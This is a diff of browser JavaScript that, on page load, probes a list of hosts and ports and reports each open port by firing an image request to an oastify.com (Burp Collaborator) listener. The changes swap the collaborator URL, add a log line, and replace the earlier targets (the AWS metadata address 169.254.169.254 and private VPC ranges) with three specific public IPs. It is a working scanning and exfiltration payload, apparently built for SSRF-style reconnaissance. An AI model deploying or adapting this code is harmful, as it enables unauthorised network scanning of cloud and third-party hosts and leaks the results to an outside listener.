@@ -11,6 +11,7 @@
                 sendPing(host, port);
                 return port;
             } catch (error) {
+                console.log(`Port ${port} is closed on ${host}`);
                 return null; // Port is closed
             }
         }
@@ -27,7 +28,7 @@
         }
 
         function sendPing(host, port) {
-            let collaboratorUrl = 'https://d6ktrternvnv02zyiu5g36k2ktqkej28.oastify.com';
+            let collaboratorUrl = 'https://zbefwfjdshsh5o4knga28spopfv6jx9ly.oastify.com';
             let pingUrl = `${collaboratorUrl}?host=${host}&port=${port}`;
             let img = new Image();
             img.src = pingUrl;
@@ -36,20 +37,13 @@
 
         document.addEventListener("DOMContentLoaded", function() {
             let ips = [
-                // AWS Metadata Service
-                '169.254.169.254',
-                // VPC Private IPs
-                '10.0.0.1', '10.0.1.1', '10.0.2.1', '10.1.1.1', '10.10.10.10',
-                '172.16.0.1', '172.16.1.1', '172.31.0.1', '172.31.1.1',
-                '192.168.0.1', '192.168.1.1', '192.168.10.1', '192.168.100.1',
-                // Common EC2 IPs
-                '10.0.0.1', '10.0.0.2', '10.0.0.3',
-                '10.1.0.1', '10.1.0.2', '10.1.0.3',
-                '172.31.0.1', '172.31.0.2', '172.31.0.3'
+                '35.90.47.18',
+                '52.12.107.46',
+                '34.214.199.77'
             ];
 
             let ports = [
-                80, 443, 8080, 3000, 22, 21, 3306, 5432, 8443, 3389, 5900, 6379, 9200, 27017
+                80, 443, 8080, 22, 21, 3306, 5432, 8443, 3389, 5900, 6379, 9200, 27017
             ]; // List of ports to scan
 
             ips.forEach(host => {
